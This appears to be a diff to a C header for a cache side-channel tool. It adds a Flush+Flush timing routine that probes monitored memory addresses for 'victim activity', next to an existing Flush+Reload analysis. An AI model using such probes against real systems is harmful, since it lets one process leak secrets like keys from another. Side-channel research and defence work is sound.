@@ -46,6 +46,10 @@ unsigned int reloadandflush(void* addr) {
 	return time_movl_clflush(addr);
 }
 
+unsigned int flushandflush(void* addr) {
+	return time_clflush_clflush(addr);
+}
+
 // Set the core in which the process goes to
 int setcoreaffinity(int core_id) {
 	int num_cores = sysconf(_SC_NPROCESSORS_ONLN);
@@ -116,6 +120,15 @@ int missedvictimactivity(unsigned long long startcycles) {
 	return 0;
 }
 
+// Put 0s on the analysis when victim activity was missed
+void missedalladdrs(unsigned int *out_analysis, unsigned long ptr_offset,
+		long int *exe_addrs, int nr_addrs) {
+	int addrs_index;
+	for (addrs_index = 0; addrs_index < nr_addrs; ++addrs_index) {
+		out_analysis[addrs_index] = 0;
+	}
+}
+
 // Analyse addrs using Flush+Reload technique
 void fr_analysealladdrs(int flag_output_raw_data, unsigned int *out_analysis, unsigned long ptr_offset,
 		long int *exe_addrs, int nr_addrs, int threshold) {
@@ -131,6 +144,19 @@ void fr_analysealladdrs(int flag_output_raw_data, unsigned int *out_analysis, un
 	}
 }
 
-
+// Analyse addrs using Flush+Flush technique
+void ff_analysealladdrs(int flag_output_raw_data, unsigned int *out_analysis, unsigned long ptr_offset,
+		long int *exe_addrs, int nr_addrs, int threshold) {
+	int addrs_index;
+	for (addrs_index = 0; addrs_index < nr_addrs; ++addrs_index) {
+		char * aux = (char*) exe_addrs[addrs_index];
+		char * ptr_to_monitor = aux + ptr_offset;
+		unsigned int auxtsc = flushandflush(ptr_to_monitor);
+		if (flag_output_raw_data)
+			out_analysis[addrs_index] = auxtsc < UINT_MAX ? auxtsc : UINT_MAX;
+		else
+			out_analysis[addrs_index] = auxtsc < threshold ? 1 : 2;
+	}
+}
 
 #endif /* CACHETECHNIQUES_H_ */
